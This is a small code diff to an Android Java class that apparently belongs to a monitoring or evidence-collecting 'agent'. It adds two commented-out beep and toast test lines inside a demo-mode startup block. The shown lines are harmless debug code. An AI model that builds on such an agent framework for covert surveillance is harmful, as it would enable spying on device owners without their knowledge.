@@ -217,6 +217,9 @@ public class Core extends Activity implements Runnable {
 		EvidenceBuilder.infoStart(); //$NON-NLS-1$
 
 		if (Cfg.DEMO) {
+
+			//Status.self().makeToast(M.e("Beep-beep Test!!!!"));
+			//Beep.beep_test();
 			Beep.bip();
 			Status.self().makeToast(M.e("Agent started!"));
 		}
